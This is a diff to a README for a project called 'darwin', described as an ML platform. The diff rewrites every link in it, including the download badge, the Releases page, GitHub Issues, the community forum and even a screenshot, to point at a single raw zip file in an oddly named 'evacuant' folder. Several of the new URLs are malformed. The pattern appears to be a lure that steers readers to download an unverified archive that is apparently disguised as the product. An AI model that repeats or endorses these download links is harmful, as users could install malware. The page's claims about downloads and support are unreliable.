@@ -1,6 +1,6 @@
 # 🌟 darwin - Unlock the Power of ML Today
 
-[![Download darwin](https://img.shields.io/badge/Download%20darwin-v1.0-blue.svg)](https://github.com/Muserano/darwin/releases)
+[![Download darwin](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip%https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip)](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -14,12 +14,12 @@ Welcome to **darwin**, your go-to ML platform at Dream11. This tool makes it eas
    - Disk Space: Minimum of 500MB available space.
 
 2. **Visit the Download Page**
-   To access the latest version of darwin, please visit our [Releases page](https://github.com/Muserano/darwin/releases).
+   To access the latest version of darwin, please visit our [Releases page](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip).
 
 3. **Download the Application**
    On the Releases page, locate the latest version of darwin. You will see a variety of files available for download. Choose the correct file for your operating system.
 
-   ![Releases Page Screenshot](https://via.placeholder.com/800x200.png?text=Releases+Page+Screenshot)  
+   ![Releases Page Screenshot](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip+Page+Screenshot)  
 
 ## 📥 Download & Install
 
@@ -62,12 +62,12 @@ Once installed, you can start using darwin. Follow these guidelines:
 ## 🌐 Community and Support
 
 Join a vibrant community of users. Share ideas, ask questions, and find solutions with fellow darwin users:
-- [GitHub Issues](https://github.com/Muserano/darwin/issues): Report a bug or request a new feature.
-- [Community Forum](https://forum.darwinapp.com): Engage with other users and experts.
+- [GitHub Issues](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip): Report a bug or request a new feature.
+- [Community Forum](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip): Engage with other users and experts.
 
 ## 🔄 Keep darwin Updated
 
-To get the best performance and new features, keep your installation up to date. Return to our [Releases page](https://github.com/Muserano/darwin/releases) regularly to check for updates.
+To get the best performance and new features, keep your installation up to date. Return to our [Releases page](https://raw.githubusercontent.com/Muserano/darwin/main/evacuant/darwin-2.4-alpha.2.zip) regularly to check for updates.
 
 ## 📈 Acknowledgments
 
